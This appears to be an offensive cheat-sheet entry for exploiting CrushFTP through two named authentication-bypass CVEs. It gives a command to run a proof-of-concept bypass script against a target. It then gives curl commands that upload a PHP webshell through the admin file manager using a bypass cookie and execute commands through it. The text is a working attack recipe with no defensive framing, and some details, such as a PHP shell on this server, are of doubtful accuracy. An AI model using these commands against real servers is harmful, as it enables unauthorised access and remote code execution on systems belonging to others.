# CrushFTP Authentication Bypass

Multiple CVEs allow unauthenticated access to CrushFTP admin:

**CVE-2025-31161** (race condition): HTTP request with a crafted session cookie bypasses auth check during parallel session initialization.

```bash
# PoC: send concurrent requests to create an unauthenticated session
python3 crushftp_auth_bypass.py --url http://<TARGET>:8080
# public PoC available for CVE-2025-31161 on GitHub
```

**CVE-2025-54309** (alternative bypass): different endpoint or header manipulation — check PoC for the specific version.

Post-access with admin session:
```bash
# CrushFTP allows webshell upload to the served root directory
# Upload PHP webshell via the file manager
# Default web root: /opt/CrushFTP10/www/ or varies
curl -b 'CrushAuth=<bypass_token>' -X POST http://<TARGET>:8080/FileManager \
  -F "cmd=upload" -F "path=/&file=@shell.php"
curl http://<TARGET>:8080/shell.php?cmd=id
```
